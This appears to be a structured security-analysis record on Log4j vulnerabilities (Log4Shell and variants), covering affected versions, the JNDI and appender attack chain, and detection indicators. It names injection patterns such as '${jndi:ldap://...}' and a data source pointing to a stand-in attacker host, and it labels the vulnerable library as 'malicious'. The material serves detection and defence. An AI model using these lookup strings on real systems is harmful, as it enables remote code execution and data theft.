package_info.package_versions: 2.0-beta9 through 2.17.0 (excluding security fix releases 2.3.2, 2.12.4, and versions after 2.17.1)
package_info.why_malicious: The package contains multiple critical vulnerabilities (Log4Shell and variants) that allow remote code execution (RCE), arbitrary code execution (ACE), information leakage, and denial of service (DOS) via unsafe JNDI lookups and misconfigurations. Attackers can exploit these flaws by injecting specially crafted log messages or manipulating configuration files, leading to full system compromise.

malicious_snippets.code_behavior: At runtime, when a log message containing a JNDI lookup pattern is processed, the code performs a JNDI lookup to an attacker-controlled LDAP server, loads and executes remote code, resulting in remote code execution.

malice_analysis.why_suspicious: The code allows arbitrary JNDI lookups based on untrusted log input, enabling attackers to trigger remote code execution by logging a crafted string.
malice_analysis.violated_expectations: Normal logging libraries should not execute remote code or perform network lookups based on log message content. Here, user input directly leads to code execution.
malice_analysis.similar_legitimate_use: JNDI lookups are sometimes used for legitimate resource resolution in enterprise Java apps, but never with untrusted input.
key_indicators: Execution of code from attacker-controlled server

execution_context.trigger: runtime (when using JMSAppender with attacker-controlled config)

malicious_snippets.code_snippet: JMSAppender configured with attacker-controlled parameters, leading to JNDI requests and deserialization of untrusted data.
malicious_snippets.code_behavior: At runtime, if the JMSAppender is enabled and configured with attacker-controlled parameters, the code deserializes untrusted data and performs JNDI lookups, resulting in remote code execution.

malice_analysis.why_suspicious: Deserialization of untrusted data and JNDI lookups from configuration parameters allow attackers to execute arbitrary code.
malice_analysis.violated_expectations: Appender configuration should not allow untrusted input to trigger code execution or network requests.
malice_analysis.similar_legitimate_use: JMSAppender is used for logging to message queues in trusted environments.

execution_context.trigger: runtime (when using JDBCAppender with attacker-controlled config)

malicious_snippets.code_snippet: JDBCAppender configured with a JNDI URI as a data source, e.g. jdbc:ldap://attacker.com/a
malicious_snippets.code_behavior: At runtime, if the JDBCAppender is configured with a JNDI URI as a data source, the code performs a JNDI lookup to an attacker-controlled server, resulting in arbitrary code execution.

malice_analysis.why_suspicious: Allowing JNDI URIs in JDBCAppender configuration enables attackers to trigger remote code execution via configuration manipulation.
malice_analysis.violated_expectations: JDBCAppender should only use trusted, local data sources, not remote JNDI URIs.
malice_analysis.similar_legitimate_use: JDBCAppender is used for logging to databases, but not with untrusted JNDI URIs.
key_indicators: Remote JNDI lookup in data source

execution_context.trigger: runtime (when processing recursive lookups in log messages)

malicious_snippets.code_behavior: At runtime, the code processes recursive lookups in log messages, leading to uncontrolled recursion and stack overflow, resulting in denial of service.

malice_analysis.why_suspicious: Uncontrolled recursion in string substitution can be triggered by crafted input, causing denial of service.
malice_analysis.violated_expectations: Logging should not allow user input to cause stack overflows or process termination.
malice_analysis.similar_legitimate_use: None; recursion in lookups is not a legitimate use case.

attack_chain.action: Attacker sends a crafted log message or manipulates configuration to include a JNDI lookup pattern.
attack_chain.leads_to: Triggering of JNDI lookup or recursive processing in the vulnerable Log4j code.

attack_chain.action: Vulnerable Log4j code processes the input, performing a JNDI lookup to an attacker-controlled server or causing recursion.
attack_chain.leads_to: Remote code execution, arbitrary code execution, or denial of service.

attack_chain.action: Attacker gains code execution, installs malware, steals data, or causes service outage.
attack_chain.leads_to: System compromise or service disruption (final goal).

behavioral_signatures: Log messages containing ${jndi:ldap://...} or similar patterns
JNDI lookups triggered by log message content
JMSAppender or JDBCAppender configured with JNDI URIs
Recursive lookup patterns in log messages
Unexpected outbound LDAP or RMI network connections from Java processes
file_indicators: Presence of org/apache/log4j/net/JMSAppender.class in log4j JAR
Log4j configuration files referencing JNDI, JMSAppender, or JDBCAppender with JNDI URIs
network_indicators: Outbound LDAP, RMI, or other JNDI-related connections to untrusted or external servers
Connections to attacker-controlled domains or IPs from Java applications
detection_knowledge.how_to_detect: Scan application dependencies for vulnerable log4j-core and log4j JARs. Monitor logs and network traffic for JNDI lookup patterns in log messages and unexpected outbound LDAP/RMI connections. Audit configuration files for use of JMSAppender, JDBCAppender with JNDI URIs, or references to JndiLookup. Remove or update vulnerable classes and upgrade to fixed versions.
